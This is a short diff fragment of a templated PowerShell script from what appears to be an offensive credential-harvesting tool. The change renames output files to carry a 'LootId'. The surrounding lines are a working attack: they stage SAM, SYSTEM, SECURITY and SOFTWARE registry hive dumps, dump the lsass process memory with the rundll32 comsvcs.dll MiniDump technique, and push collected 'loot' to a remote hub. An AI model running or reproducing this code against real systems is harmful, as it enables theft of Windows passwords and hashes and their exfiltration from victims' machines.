@@ -697,10 +697,10 @@ Partially based on:
     $SysInfo = $SysInfo | ConvertTo-Csv -NoTypeInformation
 
 
-    $SamPath = Join-Path $env:TMP "sam"
-    $SystemPath = Join-Path $env:TMP "system"
-    $SecurityPath = Join-Path $env:TMP "security"
-    $SoftwarePath = Join-Path $env:TMP "software"
+    $SamPath = Join-Path $env:TMP "sam_$($LootId)"
+    $SystemPath = Join-Path $env:TMP "system_$($LootId)"
+    $SecurityPath = Join-Path $env:TMP "security_$($LootId)"
+    $SoftwarePath = Join-Path $env:TMP "software_$($LootId)"
     $DumpFilePath = $env:TMP
 
     $Process = Get-Process lsass
@@ -712,7 +712,7 @@ Partially based on:
 
     try {
         {{'Write-Debug "Dumping sysinfo..."'|debug}}
-        $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
+        $SysInfo | PushTo-Hub -Name "sysinfo_$($LootId)" -LootId $LootId
 
         {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
         & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
